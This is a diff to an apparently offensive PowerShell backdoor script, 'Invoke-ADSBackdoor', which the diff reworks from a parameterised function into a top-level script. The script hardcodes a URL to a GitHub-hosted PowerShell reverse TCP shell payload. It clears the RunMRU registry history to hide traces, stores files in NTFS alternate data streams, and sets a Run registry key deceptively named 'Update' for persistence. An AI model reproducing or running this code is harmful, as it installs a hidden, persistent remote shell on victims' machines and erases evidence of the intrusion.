@@ -1,15 +1,6 @@
-function Invoke-ADSBackdoor{
-    
-	$PayloadURL = https://raw.githubusercontent.com/syntax3043/Powershell_rev_tcp/master/PS_rev_tcp_source.ps1
+    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
+    $PayloadURL = 'https://raw.githubusercontent.com/syntax3043/Powershell_rev_tcp/master/PS_rev_tcp_source.ps1'
 
-    [CmdletBinding()] Param(
-        [Parameter(Mandatory=$True)]
-        [string]$PayloadURL,
-    
-        [Parameter(Mandatory=$False)]
-        [String]$Arguments
-   
-    )
 
     $TextfileName = [System.IO.Path]::GetRandomFileName() + ".txt"
     $textFile = $TextfileName -split '\.',([regex]::matches($TextfileName,"\.").count) -join ''
@@ -34,4 +25,3 @@ function Invoke-ADSBackdoor{
 
     New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
     Write-Output "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Update"
-}
